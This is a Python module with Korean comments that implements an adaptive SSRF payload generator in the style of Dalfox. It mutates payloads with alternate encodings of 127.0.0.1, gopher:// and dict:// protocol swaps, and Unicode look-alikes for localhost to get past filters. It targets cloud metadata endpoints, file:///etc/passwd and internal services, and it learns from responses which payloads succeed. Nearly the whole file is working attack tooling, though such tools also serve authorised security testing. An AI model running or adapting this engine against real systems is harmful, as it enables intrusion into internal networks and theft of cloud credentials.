"""
지능형 페이로드 생성 엔진 - Dalfox 스타일 적응형 학습
"""

import random
import time
import json
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urlparse, urlencode, quote
import hashlib
import itertools
import sys
import os

# 상위 디렉토리의 config 모듈 import
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config.payloads import SSRFPayloadDatabase


class ResponsePattern:
    """응답 패턴 분석 및 저장"""

    def __init__(self):
        self.patterns = {}

    def analyze_response(self, response: Dict[str, Any], timing: Dict[str, float]) -> Dict[str, Any]:
        """응답 분석 및 패턴 추출"""
        features = {
            'status_code': response.get('status_code', 0),
            'content_length': len(response.get('content', '')),
            'response_time': timing.get('total_time', 0.0),
            'dns_time': timing.get('dns_time', 0.0),
            'headers_count': len(response.get('headers', {})),
            'error_indicators': self._extract_error_indicators(response.get('content', '')),
            'redirect_chain': len(response.get('redirect_history', [])),
            'content_hash': hashlib.md5(response.get('content', '').encode()).hexdigest()[:8]
        }

        return features

    def _extract_error_indicators(self, content: str) -> List[str]:
        """에러 지표 추출"""
        error_patterns = [
            'connection refused', 'network unreachable', 'timeout',
            'host not found', 'curl_exec', 'file_get_contents',
            'failed to open stream', 'connection error',
            'java.net.ConnectException', 'requests.exceptions'
        ]

        found_errors = []
        content_lower = content.lower()

        for pattern in error_patterns:
            if pattern in content_lower:
                found_errors.append(pattern)

        return found_errors


class PayloadMutator:
    """페이로드 변이 생성기"""

    def __init__(self):
        self.mutation_strategies = [
            self._mutate_encoding,
            self._mutate_protocol,
            self._mutate_port,
            self._mutate_path,
            self._mutate_parameters,
            self._mutate_casing,
            self._mutate_unicode
        ]

    def generate_mutations(self, base_payload: str, count: int = 10) -> List[str]:
        """기본 페이로드의 변이 생성"""
        mutations = []

        for _ in range(count):
            mutated = base_payload

            # 랜덤하게 1-3개의 변이 적용
            num_mutations = random.randint(1, min(3, len(self.mutation_strategies)))
            selected_strategies = random.sample(self.mutation_strategies, num_mutations)

            for strategy in selected_strategies:
                try:
                    mutated = strategy(mutated)
                except Exception:
                    continue

            if mutated != base_payload and mutated not in mutations:
                mutations.append(mutated)

        return mutations

    def _mutate_encoding(self, payload: str) -> str:
        """인코딩 변이"""
        if '127.0.0.1' in payload:
            # IP 인코딩 변이
            encodings = ['2130706433', '017700000001', '0x7f000001', '127.1']
            new_ip = random.choice(encodings)
            return payload.replace('127.0.0.1', new_ip)

        # URL 인코딩
        if random.random() < 0.3:
            parsed = urlparse(payload)
            if parsed.path:
                encoded_path = quote(parsed.path, safe='/')
                return payload.replace(parsed.path, encoded_path)

        return payload

    def _mutate_protocol(self, payload: str) -> str:
        """프로토콜 변이"""
        protocols = ['http://', 'https://', 'ftp://', 'gopher://', 'dict://']

        for proto in protocols:
            if payload.startswith(proto):
                new_proto = random.choice([p for p in protocols if p != proto])
                return payload.replace(proto, new_proto, 1)

        return payload

    def _mutate_port(self, payload: str) -> str:
        """포트 변이"""
        common_ports = [80, 443, 8080, 8443, 3000, 5000, 8000, 9000]

        parsed = urlparse(payload)
        if not parsed.port:
            # 포트 추가
            port = random.choice(common_ports)
            return payload.replace(parsed.netloc, f"{parsed.netloc}:{port}")
        else:
            # 포트 변경
            new_port = random.choice(common_ports)
            return payload.replace(f":{parsed.port}", f":{new_port}")

    def _mutate_path(self, payload: str) -> str:
        """경로 변이"""
        paths = ['/', '/admin', '/api', '/internal', '/status', '/health']

        parsed = urlparse(payload)
        if not parsed.path or parsed.path == '/':
            new_path = random.choice(paths[1:])  # '/' 제외
            return payload + new_path.lstrip('/')

        return payload

    def _mutate_parameters(self, payload: str) -> str:
        """파라미터 변이"""
        if '?' not in payload:
            # 파라미터 추가
            params = ['debug=1', 'test=1', 'internal=true']
            param = random.choice(params)
            return f"{payload}?{param}"

        return payload

    def _mutate_casing(self, payload: str) -> str:
        """대소문자 변이"""
        if 'localhost' in payload.lower():
            variations = ['LOCALHOST', 'LocalHost', 'localhost', 'Localhost']
            for var in variations:
                if var.lower() in payload.lower():
                    return payload.replace(var.lower(), random.choice(variations))

        return payload

    def _mutate_unicode(self, payload: str) -> str:
        """유니코드 변이"""
        unicode_replacements = {
            'localhost': ['ⓛⓞⓒⓐⓛⓗⓞⓢⓣ', '𝐍𝐨𝐜𝐚𝐍𝐡𝐨𝐬𝐭'],
            '.': ['。', '．']
        }

        for original, replacements in unicode_replacements.items():
            if original in payload:
                replacement = random.choice(replacements)
                return payload.replace(original, replacement)

        return payload


class IntelligentPayloadEngine:
    """지능형 페이로드 생성 엔진"""

    def __init__(self):
        self.payload_db = SSRFPayloadDatabase()
        self.pattern_analyzer = ResponsePattern()
        self.mutator = PayloadMutator()

        # 학습 데이터
        self.success_patterns = {}
        self.failure_patterns = {}
        self.payload_effectiveness = {}

        # 적응형 학습 설정
        self.learning_rate = 0.1
        self.exploration_rate = 0.3

    def generate_initial_payloads(self, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """타겟 정보 기반 초기 페이로드 배치 생성"""
        payloads = []

        # 1. 기본 탐지용 페이로드
        basic_payloads = self._get_detection_payloads()
        payloads.extend(basic_payloads)

        # 2. 타겟별 최적화 페이로드
        optimized_payloads = self._get_target_optimized_payloads(target_info)
        payloads.extend(optimized_payloads)

        # 3. 고위험 페이로드
        high_risk_payloads = self.payload_db.get_payloads_by_risk('critical')
        for payload_info in high_risk_payloads[:10]:  # 상위 10개만
            payloads.append({
                'payload': payload_info['payload'],
                'description': payload_info['description'],
                'category': payload_info['category'],
                'priority': 'high',
                'source': 'database'
            })

        # 4. 학습 기반 페이로드 (이전 성공 패턴)
        learned_payloads = self._get_learned_payloads(target_info)
        payloads.extend(learned_payloads)

        return payloads

    def _get_detection_payloads(self) -> List[Dict[str, Any]]:
        """기본 탐지용 페이로드"""
        detection_targets = [
            'http://127.0.0.1/',
            'http://localhost/',
            'http://169.254.169.254/',  # AWS metadata
            'http://metadata.google.internal/',  # GCP metadata
        ]

        payloads = []
        for target in detection_targets:
            payloads.append({
                'payload': target,
                'description': f'Basic detection: {target}',
                'category': 'detection',
                'priority': 'medium',
                'source': 'detection'
            })

        return payloads

    def _get_target_optimized_payloads(self, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """타겟별 최적화 페이로드"""
        payloads = []
        endpoint_type = target_info.get('endpoint_type', 'general')

        # 엔드포인트 타입별 최적화
        if endpoint_type == 'api':
            # API 엔드포인트 특화 페이로드
            api_payloads = [
                'http://127.0.0.1:8080/api/internal',
                'http://localhost:3000/api/health',
                'http://127.0.0.1:9200/_cluster/health'  # Elasticsearch
            ]
            for payload in api_payloads:
                payloads.append({
                    'payload': payload,
                    'description': f'API optimized: {payload}',
                    'category': 'api_optimized',
                    'priority': 'high',
                    'source': 'optimization'
                })

        elif endpoint_type == 'file_upload':
            # 파일 업로드 특화
            upload_payloads = [
                'file:///etc/passwd',
                'http://127.0.0.1/admin/files',
                'ftp://127.0.0.1/'
            ]
            for payload in upload_payloads:
                payloads.append({
                    'payload': payload,
                    'description': f'Upload optimized: {payload}',
                    'category': 'upload_optimized',
                    'priority': 'high',
                    'source': 'optimization'
                })

        return payloads

    def _get_learned_payloads(self, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """학습된 패턴 기반 페이로드"""
        payloads = []

        # 이전 성공 패턴 기반 생성
        if self.success_patterns:
            for pattern_key, pattern_data in self.success_patterns.items():
                if pattern_data.get('effectiveness', 0) > 0.7:  # 70% 이상 효과적
                    # 성공 패턴을 현재 타겟에 적용
                    adapted_payload = self._adapt_pattern_to_target(pattern_data, target_info)
                    if adapted_payload:
                        payloads.append({
                            'payload': adapted_payload,
                            'description': f'Learned pattern: {pattern_key}',
                            'category': 'learned',
                            'priority': 'high',
                            'source': 'learning',
                            'effectiveness': pattern_data['effectiveness']
                        })

        return payloads

    def evolve_payloads(self, feedback_data: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """피드백 기반 페이로드 진화"""
        # 응답 데이터 학습
        self._learn_from_responses(feedback_data)

        # 새로운 페이로드 생성
        evolved_payloads = []

        # 1. 성공한 페이로드의 변이 생성
        successful_payloads = [
            f['payload'] for f in feedback_data
            if f.get('success_indicators', 0) > 0.5
        ]

        for payload in successful_payloads:
            mutations = self.mutator.generate_mutations(payload, count=5)
            for mutation in mutations:
                evolved_payloads.append({
                    'payload': mutation,
                    'description': f'Mutation of successful payload',
                    'category': 'evolved',
                    'priority': 'high',
                    'source': 'evolution',
                    'parent_payload': payload
                })

        # 2. 탐색적 페이로드 (exploration)
        if random.random() < self.exploration_rate:
            random_payloads = self._generate_exploratory_payloads()
            evolved_payloads.extend(random_payloads)

        return evolved_payloads[:20]  # 최대 20개 반환

    def _learn_from_responses(self, feedback_data: List[Dict[str, Any]]) -> None:
        """응답 데이터로부터 학습"""
        for feedback in feedback_data:
            payload = feedback['payload']
            response = feedback['response']
            timing = feedback.get('timing', {})
            success_score = feedback.get('success_indicators', 0)

            # 응답 패턴 분석
            pattern = self.pattern_analyzer.analyze_response(response, timing)
            pattern_key = self._generate_pattern_key(pattern)

            # 성공/실패 패턴 업데이트
            if success_score > 0.5:  # 성공으로 간주
                if pattern_key not in self.success_patterns:
                    self.success_patterns[pattern_key] = {
                        'pattern': pattern,
                        'payloads': [],
                        'effectiveness': 0.0,
                        'count': 0
                    }

                self.success_patterns[pattern_key]['payloads'].append(payload)
                self.success_patterns[pattern_key]['count'] += 1

                # 효과성 업데이트 (이동 평균)
                old_effectiveness = self.success_patterns[pattern_key]['effectiveness']
                new_effectiveness = (old_effectiveness * (1 - self.learning_rate) +
                                   success_score * self.learning_rate)
                self.success_patterns[pattern_key]['effectiveness'] = new_effectiveness

            else:  # 실패로 간주
                if pattern_key not in self.failure_patterns:
                    self.failure_patterns[pattern_key] = {
                        'pattern': pattern,
                        'payloads': [],
                        'count': 0
                    }

                self.failure_patterns[pattern_key]['payloads'].append(payload)
                self.failure_patterns[pattern_key]['count'] += 1

            # 개별 페이로드 효과성 추적
            if payload not in self.payload_effectiveness:
                self.payload_effectiveness[payload] = []
            self.payload_effectiveness[payload].append(success_score)

    def _generate_pattern_key(self, pattern: Dict[str, Any]) -> str:
        """패턴 키 생성"""
        key_components = [
            str(pattern.get('status_code', 0)),
            str(pattern.get('content_length', 0) // 100),  # 100바이트 단위로 그룹화
            str(int(pattern.get('response_time', 0) * 10)),  # 0.1초 단위
            str(len(pattern.get('error_indicators', []))),
            pattern.get('content_hash', '')
        ]
        return '_'.join(key_components)

    def _adapt_pattern_to_target(self, pattern_data: Dict[str, Any], target_info: Dict[str, Any]) -> Optional[str]:
        """성공 패턴을 현재 타겟에 적용"""
        if not pattern_data.get('payloads'):
            return None

        # 가장 효과적이었던 페이로드 선택
        best_payload = pattern_data['payloads'][-1]  # 최근 성공 페이로드

        # 타겟 정보에 맞게 조정
        target_url = target_info.get('url', '')
        parsed_target = urlparse(target_url)

        if parsed_target.netloc:
            # 도메인 부분을 타겟 도메인으로 변경
            parsed_payload = urlparse(best_payload)
            if parsed_payload.netloc and '127.0.0.1' in parsed_payload.netloc:
                # 내부 IP를 유지하면서 포트만 조정
                return best_payload

        return best_payload

    def _generate_exploratory_payloads(self) -> List[Dict[str, Any]]:
        """탐색적 페이로드 생성"""
        exploratory = []

        # 랜덤 IP 생성
        random_ips = [
            f"192.168.{random.randint(1, 255)}.{random.randint(1, 255)}",
            f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}",
            f"172.{random.randint(16, 31)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
        ]

        for ip in random_ips[:2]:  # 2개만 선택
            exploratory.append({
                'payload': f'http://{ip}/',
                'description': f'Exploratory random IP: {ip}',
                'category': 'exploratory',
                'priority': 'low',
                'source': 'exploration'
            })

        return exploratory

    def get_learning_statistics(self) -> Dict[str, Any]:
        """학습 통계 반환"""
        return {
            'success_patterns': len(self.success_patterns),
            'failure_patterns': len(self.failure_patterns),
            'tracked_payloads': len(self.payload_effectiveness),
            'avg_success_rate': self._calculate_average_success_rate(),
            'most_effective_pattern': self._get_most_effective_pattern()
        }

    def _calculate_average_success_rate(self) -> float:
        """평균 성공률 계산"""
        if not self.payload_effectiveness:
            return 0.0

        all_scores = []
        for scores in self.payload_effectiveness.values():
            all_scores.extend(scores)

        return sum(all_scores) / len(all_scores) if all_scores else 0.0

    def _get_most_effective_pattern(self) -> Optional[str]:
        """가장 효과적인 패턴 반환"""
        if not self.success_patterns:
            return None

        best_pattern = max(
            self.success_patterns.items(),
            key=lambda x: x[1]['effectiveness']
        )

        return best_pattern[0]

    def generate_for_target(self, target_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """타겟에 최적화된 페이로드 생성 (고급 기법 포함)"""
        payloads = []

        # 1. 고급 우회 기법 우선 적용
        advanced_categories = [
            'parsing_confusion',    # URL 파싱 불일치 - 가장 효과적
            'dns_rebinding',       # DNS 리바인딩
            'encoding_bypass',     # 고급 인코딩 우회
            'ipv6_bypass',         # IPv6 표기법 우회
        ]

        for category in advanced_categories:
            category_payloads = self.payload_db.get_payloads_by_category(category)
            # 고급 기법은 더 많이 선택 (각 카테고리당 5개)
            selected = category_payloads[:5]
            for payload_data in selected:
                payloads.append({
                    'payload': payload_data['payload'],
                    'description': f"[ADVANCED] {payload_data['description']}",
                    'category': payload_data['category'],
                    'priority': 'critical',
                    'source': 'advanced_techniques',
                    'technique': payload_data.get('technique', 'unknown')
                })

        # 2. 기존 핵심 기법들
        core_categories = ['cloud_metadata', 'protocol_abuse', 'ip_encoding']
        for category in core_categories:
            category_payloads = self.payload_db.get_payloads_by_category(category)
            selected = category_payloads[:3]
            for payload_data in selected:
                payloads.append({
                    'payload': payload_data['payload'],
                    'description': payload_data['description'],
                    'category': payload_data['category'],
                    'priority': 'high',
                    'source': 'core_techniques'
                })

        # 3. 타겟별 최적화 페이로드
        optimized_payloads = self._get_target_optimized_payloads(target_info)
        payloads.extend(optimized_payloads)

        # 4. 학습된 패턴 기반 페이로드
        learned_payloads = self._get_learned_payloads(target_info)
        payloads.extend(learned_payloads)

        # 5. 탐색적 페이로드 (랜덤 생성)
        exploratory_payloads = self._generate_exploratory_payloads()
        payloads.extend(exploratory_payloads[:5])  # 최대 5개

        # 6. 페이로드 변이 적용 (고급 기법 기반)
        mutation_base = [p for p in payloads if p['priority'] in ['critical', 'high']][:10]
        for base_payload in mutation_base:
            mutations = self.mutator.generate_mutations(base_payload['payload'], 3)
            for mutation in mutations:
                payloads.append({
                    'payload': mutation,
                    'description': f"Mutated: {base_payload['description']}",
                    'category': 'mutation',
                    'priority': 'medium',
                    'source': 'mutation'
                })

        # 우선순위별 정렬 (critical > high > medium > low)
        priority_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}
        payloads.sort(key=lambda x: priority_order.get(x['priority'], 3))

        # 중복 제거
        seen_payloads = set()
        unique_payloads = []
        for payload in payloads:
            if payload['payload'] not in seen_payloads:
                seen_payloads.add(payload['payload'])
                unique_payloads.append(payload)

        return unique_payloads


def main():
    """테스트 실행"""
    engine = IntelligentPayloadEngine()

    # 샘플 타겟 정보
    target_info = {
        'url': 'http://example.com/api/fetch',
        'method': 'POST',
        'endpoint_type': 'api',
        'parameters': [
            {'name': 'url', 'type': 'text', 'location': 'body'}
        ]
    }

    print("=== 지능형 페이로드 생성 엔진 테스트 (고급 기법 포함) ===")

    # 새로운 고급 기법 기반 페이로드 생성
    advanced_payloads = engine.generate_for_target(target_info)
    print(f"\n고급 기법 기반 페이로드 생성: {len(advanced_payloads)}개")

    # 우선순위별 그룹화
    by_priority = {}
    for payload in advanced_payloads:
        priority = payload['priority']
        if priority not in by_priority:
            by_priority[priority] = []
        by_priority[priority].append(payload)

    for priority in ['critical', 'high', 'medium', 'low']:
        if priority in by_priority:
            print(f"\n[{priority.upper()}] 우선순위: {len(by_priority[priority])}개")
            for i, payload in enumerate(by_priority[priority][:3], 1):
                technique = payload.get('technique', 'N/A')
                print(f"  {i}. {payload['payload']}")
                print(f"     기법: {technique}, 설명: {payload['description']}")

    # 기법별 통계
    techniques = {}
    for payload in advanced_payloads:
        technique = payload.get('technique', 'unknown')
        techniques[technique] = techniques.get(technique, 0) + 1

    print(f"\n기법별 페이로드 수:")
    for technique, count in sorted(techniques.items()):
        print(f"  {technique}: {count}개")

    # 학습 통계
    stats = engine.get_learning_statistics()
    print(f"\n학습 통계:")
    print(f"  성공 패턴: {stats['success_patterns']}개")
    print(f"  실패 패턴: {stats['failure_patterns']}개")
    print(f"  평균 성공률: {stats['avg_success_rate']:.2%}")


if __name__ == "__main__":
    main()
